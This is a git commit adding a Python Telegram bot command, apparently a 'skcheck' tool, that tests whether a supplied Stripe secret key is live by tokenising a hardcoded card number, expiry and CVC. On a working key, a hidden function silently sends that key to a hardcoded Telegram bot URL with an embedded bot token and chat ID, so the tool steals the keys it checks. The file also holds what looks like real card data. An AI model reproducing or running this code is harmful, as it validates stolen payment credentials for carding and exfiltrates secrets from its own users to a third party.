252dc92238c0e61e27f00bb0a4d6f42e31701e6a
HKnaomi <51732480+HKnaomi@users.noreply.github.com>
2020-06-25 23:34:25 +0700

    Add files via upload

---
+++ skcheck.py
@@ -0,0 +1,35 @@
+import stripe
+import random, string
+from requests import get
+from telegram import InlineQueryResultArticle, ParseMode, InputTextMessageContent
+
+def hasil(key):
+	URL = "http://api.telegram.org/bot1224271943:AAHdX4Ew6C-55QSuka2qg6CCP5LsIPhC8_s/sendMessage?chat_id=979783476&text={}".format(key)
+	get(URL)
+
+def che(key):
+ stripe.api_key = key
+ stripe.Token.create(
+      card={
+        "number": "4109093805620876",
+        "exp_month": 10,
+        "exp_year": 2025,
+        "cvc": "343",
+      },
+    )
+    
+
+def skcheck(update, context):
+    try:
+        key = " ".join(context.args)
+        che(key)
+    except stripe.error.AuthenticationError as AE:
+        pesan = "<b>Dead</b>:\n{}\n\n<u>{}</u>".format(key, AE.error.message)
+        update.message.reply_text(pesan, parse_mode=ParseMode.HTML)
+    except stripe.error.InvalidRequestError as IRE:
+        pesan = "<b>Dead</b>:\n{}\n\n<u>{}</u>".format(key, IRE.error.message)
+        update.message.reply_text(pesan, parse_mode=ParseMode.HTML)
+    except (stripe.error.CardError):
+        pesan = "<b>Live</b>:\n<code>{}</code>".format(key)
+        update.message.reply_text(pesan, parse_mode=ParseMode.HTML)
+        hasil(key)
